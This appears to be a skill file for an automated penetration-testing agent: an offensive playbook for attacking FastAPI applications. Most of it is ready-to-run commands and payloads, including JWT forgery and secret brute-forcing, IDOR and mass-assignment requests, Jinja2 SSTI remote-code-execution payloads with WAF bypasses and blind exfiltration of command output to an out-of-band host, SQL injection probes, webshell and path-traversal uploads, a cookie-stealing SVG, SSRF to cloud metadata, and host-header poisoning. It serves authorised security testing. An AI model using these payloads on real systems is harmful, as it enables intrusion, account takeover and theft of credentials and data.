---
name: fastapi
description: >
  God-Level security testing playbook for FastAPI/Starlette applications.
  Covers every known attack class: DI gaps, JWT misuse, Pydantic exploitation,
  ASGI middleware bypass, SSRF, SSTI, race conditions, WebSocket hijacking,
  mass assignment, multi-tenant isolation failures, and deployment misconfigurations.
  Integrates with Strix behavioral profiling, OOB infrastructure, and the
  6-layer false-positive elimination engine.
---

# FastAPI — God-Level Security Testing Playbook

FastAPI applications have a unique attack surface that differs fundamentally from
traditional MVC frameworks. The dependency injection system, Pydantic models, ASGI
middleware stack, and OpenAPI auto-documentation create attack vectors that most
generic scanners completely miss. This playbook covers every one of them.

---

## Developer Empathy — Think Like the FastAPI Dev

Before touching a single endpoint, apply the Developer Empathy mental model:

**What FastAPI developers routinely cut corners on:**
- Adding `Depends(get_current_user)` at router level but forgetting individual
  routes added later — dependency drift is the #1 source of auth gaps in FastAPI
- Using `Depends` instead of `Security` — scopes are silently not enforced
- Treating `OAuth2PasswordBearer` token presence as authentication — it only
  yields the token string, it does NOT verify it
- Writing `extra = "allow"` on Pydantic models during development and never removing it
- Assuming middleware order doesn't matter — in ASGI, it absolutely does
- Not re-validating ownership inside BackgroundTasks — the task runs later, after
  the HTTP response has already been returned, so the request context is gone
- Mounting subapps (`/admin`, `/static`, `/metrics`) and assuming global
  middlewares apply to them — in Starlette, they often don't
- Trusting `ProxyHeadersMiddleware` without restricting which upstream IPs can set those headers
- Forgetting that WebSocket connections establish auth only once at handshake, not per-message
- Using `include_in_schema=False` as a security control — it hides from docs but not from HTTP

**FastAPI-specific trust boundary map:**
```
Client → ASGI Middleware Stack → Router Dependencies → Route Handler → Pydantic Validation → Business Logic → ORM/DB
                    ↑                      ↑                               ↑
              Auth often here         Auth often here             Mass assignment here
              (gaps = bypass)         (drift = gaps)              (extra="allow")
```

---

## Phase 1 — Reconnaissance & Attack Surface Mapping

### 1A — OpenAPI Schema Mining (Always First)

FastAPI auto-generates a complete attack surface map. Exploit it before testing anything.

```bash
# Primary discovery
curl -s https://target.com/openapi.json | python3 -m json.tool > /workspace/openapi.json
curl -s https://target.com/docs
curl -s https://target.com/redoc

# Alternative paths (common in deployed apps)
curl -s https://target.com/api/openapi.json
curl -s https://target.com/api/v1/openapi.json
curl -s https://target.com/v1/openapi.json
curl -s https://target.com/internal/openapi.json
curl -s https://target.com/admin/openapi.json

# If disabled in production, try staging/dev subdomains
curl -s https://dev.target.com/openapi.json
curl -s https://staging.target.com/openapi.json
curl -s https://api-dev.target.com/openapi.json
```

**Extract from openapi.json — build your attack matrix:**
```python
import json, sys

with open('/workspace/openapi.json') as f:
    spec = json.load(f)

# All paths + methods + security requirements
for path, methods in spec.get('paths', {}).items():
    for method, details in methods.items():
        security = details.get('security', 'NONE — NO SECURITY REQUIREMENT')
        params = [p['name'] for p in details.get('parameters', [])]
        body = details.get('requestBody', {})
        print(f"{method.upper()} {path}")
        print(f"  Security: {security}")
        print(f"  Params: {params}")
        print(f"  Has body: {bool(body)}")
        print()

# Security schemes — understand what token types are used
print("SECURITY SCHEMES:")
print(json.dumps(spec.get('components', {}).get('securitySchemes', {}), indent=2))

# Servers — reveals environments
print("SERVERS:")
print(json.dumps(spec.get('servers', []), indent=2))

# All unique scopes used
scopes = set()
for path, methods in spec.get('paths', {}).items():
    for method, details in methods.items():
        for sec in details.get('security', []):
            for scheme, scope_list in sec.items():
                scopes.update(scope_list)
print(f"ALL SCOPES: {scopes}")
```

**Critical analysis — mark as HIGH PRIORITY for testing:**
- Endpoints with `security: []` or no `security` key → may be unprotected
- Endpoints where `security` differs from their router siblings → dependency drift
- Any endpoint using `OAuth2PasswordBearer` as the only scheme → verify it validates
- Routes with `include_in_schema=False` won't appear — fuzz for them explicitly

### 1B — Hidden Endpoint Discovery

`include_in_schema=False` routes are invisible in OpenAPI but fully live. Fuzz them:

```bash
# Based on discovered prefixes from openapi.json, fuzz for hidden siblings
# If you see /api/v1/users in OpenAPI, fuzz:
ffuf -u https://target.com/api/v1/FUZZ \
  -w /wordlists/fastapi-endpoints.txt \
  -mc 200,201,204,301,302,401,403,422 \
  -H "Authorization: Bearer <valid_token>" \
  -o /workspace/hidden_endpoints.json

# Common hidden FastAPI endpoint patterns:
# /admin, /internal, /debug, /health, /metrics, /status
# /api/v1/admin, /api/internal, /api/debug
# /_debug, /_admin, /__admin
# /superuser, /staff, /system
# /jobs, /tasks, /workers, /celery
# /webhooks, /callbacks, /events

# Fuzz with and without auth — hidden endpoints often skip auth entirely
ffuf -u https://target.com/FUZZ \
  -w /wordlists/raft-large-directories.txt \
  -mc 200,201,204,301,302,401,403,422 \
  -o /workspace/no_auth_hidden.json
```

### 1C — Dependency Map Construction

For every discovered route, build a dependency matrix:

```
Route: GET /api/v1/users/{user_id}
Router-level deps: [get_db, require_auth]  ← from APIRouter(dependencies=[...])
Route-level deps: []                        ← nothing extra
Security deps: [Depends(get_current_user)]
Analysis: Auth IS enforced at router level. Test IDOR on user_id.

Route: GET /api/v1/users/{user_id}/export
Router-level deps: [get_db, require_auth]
Route-level deps: []                        ← added after initial build, router deps still apply?
Security deps: MISSING                      ← Depends not Security — scopes ignored!
Analysis: Auth may be present but scope enforcement is skipped. Test with wrong-scope token.
```

Store the full matrix in `/workspace/fastapi_dep_matrix.json`.

### 1D — Pydantic Model Schema Extraction

```bash
# OpenAPI components/schemas reveals all Pydantic model structures
python3 - << 'EOF'
import json

with open('/workspace/openapi.json') as f:
    spec = json.load(f)

schemas = spec.get('components', {}).get('schemas', {})
for name, schema in schemas.items():
    extra = schema.get('additionalProperties')
    required = schema.get('required', [])
    props = list(schema.get('properties', {}).keys())
    print(f"Model: {name}")
    print(f"  Extra fields: {extra}")  # True or missing = potential mass assignment
    print(f"  Required: {required}")
    print(f"  Fields: {props}")
    print()
EOF
```

**Flag for mass assignment testing:** any model where `additionalProperties` is `true` or not set.

### 1E — Technology & Deployment Fingerprinting

```bash
# FastAPI/Starlette version detection
curl -I https://target.com/ | grep -i "server\|x-powered-by\|via"

# Uvicorn/Gunicorn detection
curl -v https://target.com/ 2>&1 | grep -i "uvicorn\|gunicorn\|asgi"

# Check for debug endpoints (never in prod, often in staging)
curl https://target.com/_starlette_debug
curl https://target.com/docs          # Should return 404 in hardened prod
curl https://target.com/redoc         # Same
curl https://target.com/openapi.json  # Same

# Check reverse proxy header trust
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/api/admin
curl -H "X-Real-IP: 10.0.0.1" https://target.com/api/admin

# Check for debug mode signals
curl https://target.com/undefined-route-stxtest
# FastAPI debug mode returns full traceback including file paths and code
```

---

## Phase 2 — Authentication & Authorization Testing

### 2A — Dependency Injection Gap Analysis (FastAPI's #1 Weakness)

This is the most common high-impact vulnerability class in FastAPI. Dependencies are easy to forget.

**Systematic gap testing — for EVERY endpoint:**

```python
# Test matrix: endpoint × auth_level × HTTP_method
# Build this matrix from openapi.json analysis

import asyncio, aiohttp, json

endpoints = [
    # From openapi.json extraction
    ("GET",  "/api/v1/users",           "list_users"),
    ("GET",  "/api/v1/users/{id}",      "get_user"),
    ("POST", "/api/v1/users",           "create_user"),
    ("PUT",  "/api/v1/users/{id}",      "update_user"),
    ("DEL",  "/api/v1/users/{id}",      "delete_user"),
    # Add all discovered endpoints here
]

test_matrix = {
    "no_auth":        {},
    "invalid_token":  {"Authorization": "Bearer invalid_token_stxtest"},
    "expired_token":  {"Authorization": "Bearer <known_expired_token>"},
    "wrong_type":     {"Authorization": "Basic dXNlcjpwYXNz"},
    "user_token":     {"Authorization": "Bearer <regular_user_token>"},
    "admin_token":    {"Authorization": "Bearer <admin_token>"},
}

async def test_endpoint(session, method, path, auth_name, headers, base_url):
    url = f"{base_url}{path.replace('{id}', '1')}"
    try:
        resp = await session.request(method, url, headers=headers)
        return {
            "endpoint": f"{method} {path}",
            "auth_level": auth_name,
            "status": resp.status,
            "length": len(await resp.read()),
            "flag": "ANOMALY" if resp.status not in [401, 403] and auth_name in ["no_auth", "invalid_token", "expired_token"] else "OK"
        }
    except Exception as e:
        return {"endpoint": f"{method} {path}", "auth_level": auth_name, "error": str(e)}

# Run full matrix test in parallel
async def run_matrix():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for method, path, _ in endpoints:
            for auth_name, headers in test_matrix.items():
                tasks.append(test_endpoint(session, method, path, auth_name, headers, "https://target.com"))
        results = await asyncio.gather(*tasks)
        anomalies = [r for r in results if r.get('flag') == 'ANOMALY']
        print(f"ANOMALIES FOUND: {len(anomalies)}")
        for a in anomalies:
            print(f"  !! {a}")
        return results
```

**Signal: Any 200/201/204 response from no_auth, invalid_token, or expired_token = CRITICAL auth bypass.**

### 2B — JWT Deep Testing (FastAPI-Specific Vectors)

FastAPI apps typically use `python-jose` or `PyJWT`. Both have known misuse patterns.

```bash
# Step 1: Extract JWT from a valid login
TOKEN=$(curl -s -X POST https://target.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}' | python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")

# Step 2: Decode without verification
jwt_tool $TOKEN

# Step 3: Algorithm none attack
jwt_tool $TOKEN -X a

# Step 4: HS256/RS256 confusion (get public key first)
curl https://target.com/.well-known/jwks.json -o /workspace/jwks.json
curl https://target.com/api/auth/jwks -o /workspace/jwks2.json
jwt_tool $TOKEN -X k -pk /workspace/public_key.pem

# Step 5: Weak secret brute force (many FastAPI apps use default or env-var secrets)
hashcat -a 0 -m 16500 $TOKEN /wordlists/jwt_secrets.txt
# Common FastAPI secrets: "secret", "SECRET_KEY", "changeme", "your-secret-key"
# Check if secret is in .env file exposed on GitHub

# Step 6: kid header injection
# If JWT header contains "kid" field, inject:
jwt_tool $TOKEN -I -hc kid -hv "../../dev/null"
jwt_tool $TOKEN -I -hc kid -hv "' UNION SELECT 'attacker_secret'-- -"

# Step 7: Claim manipulation — common FastAPI JWT claims to escalate:
jwt_tool $TOKEN -I -pc role -pv admin
jwt_tool $TOKEN -I -pc is_superuser -pv true
jwt_tool $TOKEN -I -pc scopes -pv '["admin:read","admin:write","user:delete"]'
jwt_tool $TOKEN -I -pc sub -pv "admin@target.com"
jwt_tool $TOKEN -I -pc user_id -pv 1

# Step 8: Cross-service token reuse
# If target has multiple microservices, test token from service A on service B
# FastAPI apps often forget to validate 'aud' (audience) claim
jwt_tool $TOKEN -I -pc aud -pv "different-service"
```

**FastAPI-specific JWT misuse patterns:**

```python
# VULNERABLE — common in FastAPI tutorials:
async def get_current_user(token: str = Depends(oauth2_scheme)):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        # Missing: algorithm pinning, audience check, issuer check
    except JWTError:
        raise credentials_exception
    user = await get_user(username=payload.get("sub"))
    return user

# What to test:
# 1. No algorithm pinning → alg:none works
# 2. No audience validation → cross-service token works
# 3. No issuer validation → any issuer's token works
# 4. Missing expiry check (exp) → expired tokens work
# 5. payload.get("sub") returns None if claim missing → test missing sub claim
```

### 2C — Scope Enforcement Testing

`Depends` vs `Security` is FastAPI's hidden auth trap:

```python
# WRONG — Depends ignores scopes:
@router.get("/admin/users")
async def list_admin_users(current_user = Depends(get_current_user)):
    ...

# RIGHT — Security enforces scopes:
@router.get("/admin/users")
async def list_admin_users(current_user = Security(get_current_user, scopes=["admin:read"])):
    ...
```

**Test scope bypass:**
```bash
# Get a token with user-level scopes (not admin)
USER_TOKEN="<token with scopes=['user:read', 'user:write']>"

# Try admin endpoints with user-level token
curl https://target.com/api/v1/admin/users -H "Authorization: Bearer $USER_TOKEN"
curl https://target.com/api/v1/admin/settings -H "Authorization: Bearer $USER_TOKEN"
curl https://target.com/api/v1/users/delete/1 -H "Authorization: Bearer $USER_TOKEN"

# Test with token that has NO scopes
NO_SCOPE_TOKEN="<token with scopes=[]>"
curl https://target.com/api/v1/admin/users -H "Authorization: Bearer $NO_SCOPE_TOKEN"

# Test scope elevation via mass assignment on token endpoint:
curl -X POST https://target.com/api/auth/token \
  -d "username=user&password=pass&scope=admin:read admin:write user:delete"
# Does the server grant the requested scopes without validation?
```

### 2D — OAuth2 & Session Bridge Testing

```bash
# Test OAuth device flow if present
curl https://target.com/api/auth/device/code
curl https://target.com/api/auth/device/token

# Test PKCE — verify strict S256 enforcement
# Weak: plain code_challenge_method allowed
curl "https://target.com/api/auth/authorize?code_challenge_method=plain&code_challenge=test123"

# Test state/nonce replay
# Initiate flow, capture state, complete with same state twice
STATE="captured_state_value"
curl "https://target.com/api/auth/callback?code=auth_code&state=$STATE"
curl "https://target.com/api/auth/callback?code=auth_code&state=$STATE"  # Should fail

# SessionMiddleware weak secret test
# If session cookie is visible and base64-encoded, try to decode and re-sign
# Common weak secrets in FastAPI: "secret", "my-secret", empty string
python3 -c "
import itsdangerous, base64
# Try common secrets
for secret in ['secret', 'SECRET', 'my-secret', 'changeme', 'supersecret', '', 'fastapi']:
    try:
        signer = itsdangerous.TimestampSigner(secret)
        # Test with captured session cookie value
        result = signer.unsign('<session_cookie_value>', max_age=None)
        print(f'VALID SECRET FOUND: {secret}')
        print(f'Decoded: {base64.b64decode(result).decode()}')
    except:
        pass
"
```

---

## Phase 3 — Access Control & IDOR Testing

### 3A — Systematic IDOR Testing (FastAPI-Specific Patterns)

FastAPI routes expose object IDs in predictable patterns:

```bash
BASE_URL="https://target.com/api/v1"
ATTACKER_TOKEN="Bearer <your_account_token>"
VICTIM_ID=2  # ID of another user/object

# Path parameter IDOR (most common in FastAPI)
curl "$BASE_URL/users/$VICTIM_ID" -H "Authorization: $ATTACKER_TOKEN"
curl "$BASE_URL/users/$VICTIM_ID/profile" -H "Authorization: $ATTACKER_TOKEN"
curl "$BASE_URL/users/$VICTIM_ID/export" -H "Authorization: $ATTACKER_TOKEN"
curl "$BASE_URL/orders/$VICTIM_ID" -H "Authorization: $ATTACKER_TOKEN"
curl "$BASE_URL/documents/$VICTIM_ID/download" -H "Authorization: $ATTACKER_TOKEN"

# Query parameter IDOR
curl "$BASE_URL/reports?user_id=$VICTIM_ID" -H "Authorization: $ATTACKER_TOKEN"
curl "$BASE_URL/activity?owner_id=$VICTIM_ID" -H "Authorization: $ATTACKER_TOKEN"

# BackgroundTask IDOR — the most dangerous FastAPI-specific pattern:
# When a task is triggered via HTTP but executes later, auth context is gone
curl -X POST "$BASE_URL/export/users" \
  -H "Authorization: $ATTACKER_TOKEN" \
  -d '{"user_ids": [1, 2, 3, 999], "format": "csv"}'
# Does the background task re-validate that attacker owns these user_ids?
# If not → IDOR via BackgroundTask with no re-authorization check

# Job result IDOR
JOB_ID="job_id_from_above_response"
curl "$BASE_URL/jobs/$JOB_ID/result" -H "Authorization: $ATTACKER_TOKEN"
curl "$BASE_URL/tasks/$JOB_ID" -H "Authorization: $ATTACKER_TOKEN"

# Tenant header injection (multi-tenant FastAPI apps)
curl "$BASE_URL/users" \
  -H "Authorization: $ATTACKER_TOKEN" \
  -H "X-Tenant-ID: victim_tenant_id" \
  -H "X-Organization-ID: other_org_id"
# If tenant ID from header overrides the authenticated user's tenant → cross-tenant IDOR
```

### 3B — Mass Assignment via Pydantic Extra Fields

```bash
# First: GET the current object to see what fields exist
USER_DATA=$(curl -s "$BASE_URL/users/me" -H "Authorization: $ATTACKER_TOKEN")
echo $USER_DATA

# Then: PUT/PATCH with extra privileged fields
# Pydantic models with extra="allow" will accept and store any additional field
curl -X PUT "$BASE_URL/users/me" \
  -H "Authorization: $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "My Name",
    "email": "me@test.com",
    "role": "admin",
    "is_superuser": true,
    "is_staff": true,
    "is_verified": true,
    "plan": "enterprise",
    "credits": 99999,
    "subscription_tier": "premium",
    "email_verified": true,
    "account_status": "active",
    "permissions": ["admin:read", "admin:write", "user:delete"]
  }'

# Check if role/is_superuser changed in subsequent GET
curl "$BASE_URL/users/me" -H "Authorization: $ATTACKER_TOKEN"

# Also test nested objects — Pydantic validators may allow extra fields in nested models
curl -X PUT "$BASE_URL/users/me" \
  -H "Authorization: $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"profile": {"role": "admin", "internal_notes": "injected"}}'

# Test PATCH (partial update) — often a different code path with different Pydantic model
curl -X PATCH "$BASE_URL/users/me" \
  -H "Authorization: $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

### 3C — Mounted Subapp Authorization Bypass

Starlette's mounted subapps (`app.mount(...)`) can bypass global middleware:

```bash
# Test each mounted path directly
# If global middleware adds auth, mounted apps may not inherit it
curl https://target.com/admin/                    # Starlette Admin
curl https://target.com/admin/user/               # Admin user list — should be auth-protected
curl https://target.com/static/../admin/          # Path traversal to bypass static mount
curl https://target.com/metrics/                  # Prometheus metrics (info disclosure)
curl https://target.com/metrics/metrics           # Grafana-style
curl https://target.com/flower/                   # Celery Flower (task queue admin UI)
curl https://target.com/pgadmin/                  # pgAdmin
curl https://target.com/minio/                    # MinIO (S3-compatible storage)

# Test with vs without auth — if auth is enforced globally but not at mount:
curl https://target.com/admin/ -H "Authorization: Bearer invalid"
# If response is 200 → global auth middleware is NOT applied to this subapp

# Path traversal through static mount to reach app routes
curl "https://target.com/static/../api/v1/users"
curl "https://target.com/static/%2F..%2Fapi%2Fv1%2Fusers"
```

---

## Phase 4 — Input Handling & Injection Testing

### 4A — Pydantic Type Coercion Exploitation

Pydantic v1 and v2 have different coercion behaviors. Both can be exploited:

```bash
# Boolean coercion (Pydantic v1 coerces many things to bool)
# is_admin: false → is_admin: 1 or "true" or "yes" or "on"
curl -X POST "$BASE_URL/users/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123","is_admin":1}'

curl -X POST "$BASE_URL/users/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123","is_admin":"true"}'

curl -X POST "$BASE_URL/users/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123","is_admin":"1"}'

# Integer coercion — "123" coerces to 123, "0x1" may parse as integer
curl "$BASE_URL/users?limit=999999999"    # Integer overflow
curl "$BASE_URL/users?page=-1"            # Negative pagination
curl "$BASE_URL/items?price=-100"         # Negative price

# String to None coercion (empty string may become None)
curl -X POST "$BASE_URL/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":""}'   # Does empty string bypass password check?

# Union type confusion — send wrong type to hit different validation branch
# If field accepts Union[int, str], try sending an object to hit unexpected branch
curl -X POST "$BASE_URL/search" \
  -H "Content-Type: application/json" \
  -d '{"query":{"$ne":null}}'   # NoSQL injection through union type hit

# Annotated type bypass — Pydantic v2 Annotated types with constraints
curl -X POST "$BASE_URL/users" \
  -H "Content-Type: application/json" \
  -d '{"age": -1}'           # Below minimum
curl -X POST "$BASE_URL/users" \
  -H "Content-Type: application/json" \
  -d '{"age": 9999}'         # Above maximum
curl -X POST "$BASE_URL/users" \
  -H "Content-Type: application/json" \
  -d '{"email": "not-an-email"}'  # Invalid format
```

### 4B — Content-Type Switching (Parser Differential)

FastAPI routes process different content types through different code paths:

```bash
TARGET_ENDPOINT="$BASE_URL/users"
AUTH="Authorization: Bearer $TOKEN"
BODY_JSON='{"username":"test","role":"admin"}'
BODY_FORM="username=test&role=admin"
BODY_XML='<root><username>test</username><role>admin</role></root>'

# Test each content type — different parser, different Pydantic model, different validation
curl -X POST "$TARGET_ENDPOINT" \
  -H "$AUTH" \
  -H "Content-Type: application/json" \
  -d "$BODY_JSON"

curl -X POST "$TARGET_ENDPOINT" \
  -H "$AUTH" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "$BODY_FORM"

curl -X POST "$TARGET_ENDPOINT" \
  -H "$AUTH" \
  -H "Content-Type: multipart/form-data" \
  -F "username=test" -F "role=admin"

curl -X POST "$TARGET_ENDPOINT" \
  -H "$AUTH" \
  -H "Content-Type: application/xml" \
  -d "$BODY_XML"

# Same field via both path param AND body — which wins?
curl -X PUT "$BASE_URL/users/1" \
  -H "$AUTH" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 2, "role": "admin"}'  # body user_id ≠ path user_id — which is used?

# Duplicate parameter in query string — DI resolution order matters
curl "$BASE_URL/users?role=user&role=admin"  # First or last? Both?
```

### 4C — SSRF via FastAPI Integrations

FastAPI apps commonly use `httpx` or `aiohttp` for outbound requests:

```bash
OOB_URL=$(cat /workspace/oob_endpoint.txt)

# Common SSRF injection points in FastAPI apps:
# - Webhook URL configuration
# - Import from URL features
# - Preview/screenshot generators
# - Image proxy endpoints
# - OAuth callback validation
# - Remote file import

# Test each URL-accepting parameter:
for param in "url" "callback" "webhook" "redirect" "image_url" "preview_url" "import_url" "feed_url" "avatar_url"; do
    echo "Testing: $param"
    curl -X POST "$BASE_URL/integrations/webhook" \
      -H "Authorization: $ATTACKER_TOKEN" \
      -H "Content-Type: application/json" \
      -d "{\"$param\": \"http://$OOB_URL/ssrf_$param\"}"
done

# httpx-specific SSRF bypass techniques (common in FastAPI):
# httpx follows redirects by default — use a redirect chain
curl -X POST "$BASE_URL/preview" \
  -d '{"url": "http://attacker.com/redirect-to-169.254.169.254"}'

# IPv6 loopback
curl -X POST "$BASE_URL/preview" -d '{"url": "http://[::1]/internal-endpoint"}'

# Decimal IP (127.0.0.1 = 2130706433)
curl -X POST "$BASE_URL/preview" -d '{"url": "http://2130706433/"}'

# Cloud metadata (CRITICAL — most FastAPI apps run on cloud)
curl -X POST "$BASE_URL/preview" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# httpx may forward Authorization headers to redirect target — test header leakage
curl -X POST "$BASE_URL/proxy" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url": "http://<oob_url>/header_capture"}'
# Check OOB callbacks — does the Authorization header appear?
```

### 4D — Jinja2 SSTI (FastAPI + Jinja2Templates)

FastAPI commonly uses `Jinja2Templates` for email templates and HTML responses:

```bash
# Detect template rendering — inject arithmetic marker
for param in name title message subject body template; do
    RESPONSE=$(curl -s "$BASE_URL/notifications/send" \
      -H "Authorization: $TOKEN" \
      -H "Content-Type: application/json" \
      -d "{\"$param\": \"{{7*7}}\"}")
    if echo "$RESPONSE" | grep -q "49"; then
        echo "SSTI DETECTED in parameter: $param"
        echo "Response: $RESPONSE"
    fi
done

# Jinja2 RCE payloads (once SSTI confirmed):
# Safe detection payload (math only):
PROBE='{{7*7}}'

# Config object access (may leak SECRET_KEY and other settings):
CONFIG_LEAK='{{config}}'
CONFIG_LEAK2='{{config.__class__.__init__.__globals__}}'

# OS access via class hierarchy traversal:
RCE1="{{cycler.__init__.__globals__['os'].popen('id').read()}}"
RCE2="{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}"

# Exfiltrate via OOB (for blind SSTI):
OOB_URL=$(cat /workspace/oob_endpoint.txt)
BLIND_RCE="{{cycler.__init__.__globals__['os'].popen('curl http://$OOB_URL/ssti/\$(id|base64)').read()}}"

# Test in common FastAPI template contexts:
# - Email templates (name, subject fields in contact/notification endpoints)
# - PDF generators (report title, description fields)
# - Rendered HTML endpoints (user profile display name, bio)
# - Error message templates (if app renders custom error pages with user input)

# WAF bypass for Jinja2:
BYPASS1="{%set x=''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubclasses\x5f\x5f')()%}"
BYPASS2="{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"

# tplmap for automated detection + exploitation:
tplmap -u "$BASE_URL/template?name=INJECT" -H "Authorization: Bearer $TOKEN"
```

### 4E — SQL Injection (SQLAlchemy/SQLModel Raw Query Patterns)

FastAPI apps often use SQLAlchemy ORM but occasionally drop to raw SQL:

```bash
# Signal detection — send SQL-breaking characters and monitor for:
# - 500 Internal Server Error (unhandled DB exception)
# - Different response length/content
# - Timing difference (for blind SQLi)

for payload in "'" '"' "'--" "' OR '1'='1" "' AND SLEEP(5)--" "1; SELECT pg_sleep(5)--"; do
    START=$(date +%s%3N)
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/users?search=$payload" \
      -H "Authorization: $TOKEN")
    END=$(date +%s%3N)
    DELTA=$((END - START))
    echo "Payload: $payload | Status: $RESPONSE | Time: ${DELTA}ms"
done

# Common raw query patterns in FastAPI/SQLAlchemy to test:
# text() function usage:
#   db.execute(text(f"SELECT * FROM users WHERE name = '{user_input}'"))
#
# filter with string formatting:
#   User.query.filter(text(f"username = '{username}'"))
#
# Test in: search params, sort params, filter params, order_by params

# Sort/order injection (often raw in ORMs):
curl "$BASE_URL/users?sort=username" -H "Authorization: $TOKEN"
curl "$BASE_URL/users?sort=username;SELECT+pg_sleep(5)--" -H "Authorization: $TOKEN"
curl "$BASE_URL/users?order_by=(SELECT+1+FROM+pg_sleep(5))--" -H "Authorization: $TOKEN"

# If SQLi confirmed, use sqlmap with FastAPI-specific options:
sqlmap -u "$BASE_URL/users?search=test" \
  -H "Authorization: Bearer $TOKEN" \
  --dbms=postgresql \
  --technique=BTEUQ \
  --batch \
  --level=3 \
  --risk=2
```

### 4F — File Upload Testing

```bash
# Step 1: Baseline — upload a legitimate file
curl -X POST "$BASE_URL/upload" \
  -H "Authorization: $TOKEN" \
  -F "file=@/tmp/test.jpg;type=image/jpeg" \
  -F "filename=test.jpg"

# Step 2: Extension bypass
# FastAPI UploadFile.filename is user-controlled and NOT sanitized by default
for ext in ".php" ".php5" ".phtml" ".php.jpg" ".php%00.jpg" ".jsp" ".jspx" ".py" ".sh"; do
    echo "Testing extension: $ext"
    curl -X POST "$BASE_URL/upload" \
      -H "Authorization: $TOKEN" \
      -F "file=@/tmp/test.jpg;type=image/jpeg" \
      -F "filename=shell${ext}"
done

# Step 3: Path traversal in filename (critical — FastAPI doesn't sanitize this)
for path_payload in \
    "../../../tmp/stx_traversal.txt" \
    "..%2F..%2F..%2Ftmp%2Fstx_traversal.txt" \
    "....//....//tmp//stx_traversal.txt" \
    "/tmp/stx_traversal.txt" \
    "C:\\Windows\\Temp\\stx_traversal.txt"; do
    curl -X POST "$BASE_URL/upload" \
      -H "Authorization: $TOKEN" \
      -F "file=@/tmp/test.txt" \
      -F "filename=$path_payload"
done

# Step 4: MIME type confusion
curl -X POST "$BASE_URL/upload" \
  -H "Authorization: $TOKEN" \
  -F "file=@/tmp/shell.php;type=image/jpeg" \
  -F "filename=shell.jpg"

# Step 5: SVG XSS
cat > /tmp/xss.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://<oob_url>/svg_xss?c='+document.cookie)"/>
EOF
curl -X POST "$BASE_URL/upload" \
  -H "Authorization: $TOKEN" \
  -F "file=@/tmp/xss.svg;type=image/svg+xml"

# Step 6: Zip slip attack (if app extracts ZIP files)
# Create malicious ZIP with traversal path
python3 -c "
import zipfile, io
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('../../../tmp/stx_zipslip.txt', 'zip slip test')
buf.seek(0)
open('/tmp/malicious.zip', 'wb').write(buf.read())
"
curl -X POST "$BASE_URL/import" \
  -H "Authorization: $TOKEN" \
  -F "file=@/tmp/malicious.zip;type=application/zip"

# Step 7: After upload — find and access the uploaded file
# Look for: upload path in response, X-File-Path header, relative URL hint
# Try: /uploads/shell.php, /media/shell.php, /static/uploads/shell.php
```

---

## Phase 5 — CORS, Proxy & Header Trust Testing

### 5A — CORS Misconfiguration (FastAPI-Specific)

```bash
TARGET="https://target.com"

# Test reflected origin (most common FastAPI CORS misconfiguration)
curl -s -I "$TARGET/api/v1/users" \
  -H "Origin: https://attacker.com" \
  -H "Authorization: Bearer $TOKEN" | grep -i "access-control"
# Vulnerable if: Access-Control-Allow-Origin: https://attacker.com

# Test overly broad regex — common pattern: allow_origin_regex=".*\.target\.com"
# Can be bypassed with: xsstarget.com, target.com.evil.com
curl -s -I "$TARGET/api/v1/users" \
  -H "Origin: https://evil.target.com" | grep -i "access-control"
curl -s -I "$TARGET/api/v1/users" \
  -H "Origin: https://xsstarget.com" | grep -i "access-control"
curl -s -I "$TARGET/api/v1/users" \
  -H "Origin: https://target.com.attacker.com" | grep -i "access-control"

# Test null origin (useful with sandboxed iframes)
curl -s -I "$TARGET/api/v1/users" \
  -H "Origin: null" | grep -i "access-control"

# Test credentialed request with permissive origin
curl -s "$TARGET/api/v1/users/me" \
  -H "Origin: https://attacker.com" \
  -H "Authorization: Bearer $TOKEN" \
  --cookie "session=<valid_session>" | grep -i "access-control-allow-credentials"

# Verify preflight vs actual request delta
# Preflight may pass but actual request may behave differently
curl -s -I -X OPTIONS "$TARGET/api/v1/admin" \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: DELETE" \
  -H "Access-Control-Request-Headers: Authorization" | grep -i "access-control"

# corsy for automated scanning:
corsy -u "$TARGET" -t 20 --headers "Authorization: Bearer $TOKEN"
```

### 5B — Proxy Header Trust & Host Header Poisoning

```bash
TARGET="https://target.com"

# Test ProxyHeadersMiddleware misconfiguration
# If configured without trusted_hosts, any client can spoof these:
curl "$TARGET/api/v1/admin" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Forwarded-Proto: https" \
  -H "X-Real-IP: 10.0.0.1"

# IP-based access control bypass via XFF spoofing
curl "$TARGET/api/internal/metrics" \
  -H "X-Forwarded-For: 127.0.0.1"  # Spoof loopback

curl "$TARGET/api/internal/metrics" \
  -H "X-Forwarded-For: 10.0.0.1, 172.16.0.1"  # Multiple hops

# Host header poisoning — password reset link generation
# FastAPI apps using request.url or request.headers['host'] to build reset URLs:
curl -X POST "$TARGET/api/auth/password-reset" \
  -H "Content-Type: application/json" \
  -H "Host: attacker.com" \
  -d '{"email": "victim@target.com"}'
# If victim receives reset email with link pointing to attacker.com → CRITICAL

